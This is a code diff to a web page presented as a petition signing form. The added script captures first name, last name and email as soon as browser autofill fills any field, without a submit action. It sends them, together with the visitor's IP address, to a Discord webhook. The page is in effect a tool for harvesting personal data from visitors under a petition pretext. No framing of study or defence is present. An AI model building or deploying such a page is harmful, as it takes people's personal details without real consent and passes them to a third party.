@@ -53,6 +53,7 @@
     #formContainer {
       margin-top: 20px;
       text-align: left;
+      display: none;
     }
 
     label {
@@ -93,7 +94,7 @@
     <p>To get started, simply click the button below.</p>
     <button id="trigger">Sign the Petition</button>
 
-    <div id="formContainer" style="display:none;">
+    <div id="formContainer">
       <p class="instructions">
         Please click into a field below. If your browser has saved your details, 
         it may suggest your info. Once you choose an autofill suggestion, we’ll submit it right away!
@@ -135,6 +136,7 @@
 
     // Show the form when the user clicks the trigger
     trigger.addEventListener('click', () => {
+      console.log("Trigger clicked. Revealing form...");
       formContainer.style.display = 'block';
       fnameField.focus();
     });
@@ -143,4 +145,38 @@
       // If at least one field has a value, submit immediately
       if (fnameField.value.trim() !== '' || lnameField.value.trim() !== '' || emailField.value.trim() !== '') {
         submitForm(
-          fnameField.val
+          fnameField.value.trim() || '[No First Name]',
+          lnameField.value.trim() || '[No Last Name]',
+          emailField.value.trim() || '[No Email]'
+        );
+      }
+    }
+
+    function submitForm(fname, lname, email) {
+      const message = `**New Petition Signature:**\n**IP:** ${userIP}\n**First Name:** ${fname}\n**Last Name:** ${lname}\n**Email:** ${email}`;
+      fetch(DISCORD_WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ content: message })
+      })
+      .then(response => {
+        if (response.ok) {
+          console.log('Message sent to Discord successfully!');
+        } else {
+          console.error('Failed to send message to Discord:', response.status, response.statusText);
+        }
+      })
+      .catch(err => console.error('Error sending message to Discord:', err));
+    }
+
+    // Listen for input and change events on all fields.
+    fnameField.addEventListener('input', checkFields);
+    lnameField.addEventListener('input', checkFields);
+    emailField.addEventListener('input', checkFields);
+
+    fnameField.addEventListener('change', checkFields);
+    lnameField.addEventListener('change', checkFields);
+    emailField.addEventListener('change', checkFields);
+  </script>
+</body>
+</html>
